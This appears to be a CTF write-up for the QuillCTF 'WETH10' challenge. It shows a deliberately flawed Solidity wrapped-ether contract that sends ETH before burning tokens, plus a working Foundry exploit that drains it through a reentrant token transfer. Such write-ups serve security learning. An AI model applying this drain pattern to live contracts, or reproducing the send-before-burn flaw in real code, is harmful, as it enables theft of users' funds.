---
title: QuillCTF-9.WETH10
date: 2024-01-22 17:01:42
tags:
    - Defi
categories: 
    - QuillCTF
---
```
Tired of WETH9, we created an overall better version of the commonly used contract, providing a trustless, immutable, and standardized way for smart contracts to abstract away the difference between the native ETH asset and fungible ERC-20 tokens. We call it WETH10, the Messi Wrapped Ether.
```

## Objective

- The contract currently has 10 ethers. (Check the Foundry configuration.) You are Bob (the White Hat). Your job is to rescue all the funds from the contract, starting with 1 ether, in only one transaction.

## Code

```solidity
pragma solidity ^0.8.0;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {ReentrancyGuard} from "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import {Address} from "@openzeppelin/contracts/utils/Address.sol";

// The Messi Wrapped Ether
contract WETH10 is ERC20("Messi Wrapped Ether", "WETH10"), ReentrancyGuard {
    receive() external payable {
        deposit();
    }

    function _burnAll() internal {
        _burn(msg.sender, balanceOf(msg.sender));
    }

    function deposit() public payable nonReentrant {
        _mint(msg.sender, msg.value);
    }

    function withdraw(uint256 wad) external nonReentrant {
        Address.sendValue(payable(msg.sender), wad);
        _burn(msg.sender, wad);
    }

    function withdrawAll() external nonReentrant {
        Address.sendValue(payable(msg.sender), balanceOf(msg.sender));
        _burnAll();
    }

    /// @notice Request a flash loan in ETH
    function execute(address receiver, uint256 amount, bytes calldata data) external nonReentrant {
        uint256 prevBalance = address(this).balance;
        Address.functionCallWithValue(receiver, data, amount);

        require(address(this).balance >= prevBalance, "flash loan not returned");
    }
}
```

## Observation

First , i saw the flashloan, but it didn't work.

then , i saw this function:
```
function withdrawAll() external nonReentrant {
        Address.sendValue(payable(msg.sender), balanceOf(msg.sender));
        _burnAll();
    }
    
function _burnAll() internal {
	_burn(msg.sender, balanceOf(msg.sender));
}
```

so if will transfer it before burn . we can attack it !

## Attack
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/10-Wthe10/WETH10.sol";

contract WETH10Exploit {
    WETH10 weth;
    address payable bob;

    constructor(WETH10 _weth10, address _bob) payable {
        weth = _weth10;
        bob = payable(_bob);
    }

    function attack() external {
        for (; address(weth).balance != 0;) {
            weth.deposit{value: 1 ether}();
            weth.withdrawAll();

            weth.transferFrom(bob, address(this), 1 ether);
        }
        (bool success,) = bob.call{value: address(this).balance}("");
        require(success);
    }

    receive() external payable {
        weth.transfer(bob, 1 ether);
    }
}

contract Weth10Test is Test {
    WETH10 public weth;
    address owner;
    address bob;

    function setUp() public {
        weth = new WETH10();
        bob = makeAddr("bob");

        vm.deal(address(weth), 10 ether);
        vm.deal(address(bob), 1 ether);
    }

    function testHack() public {
        assertEq(address(weth).balance, 10 ether, "weth contract should have 10 ether");

        vm.startPrank(bob);

        // hack time!
        WETH10Exploit exploit = new WETH10Exploit{value: bob.balance}(weth, bob);
        console.log("Exploit address: %s", address(exploit));
        console.log("Exploit balance: %s", address(exploit).balance);
        weth.approve(address(exploit), type(uint256).max);
        exploit.attack();

        vm.stopPrank();
        assertEq(address(weth).balance, 0, "empty weth contract");
        assertEq(bob.balance, 11 ether, "player should end with 11 ether");
    }
}
```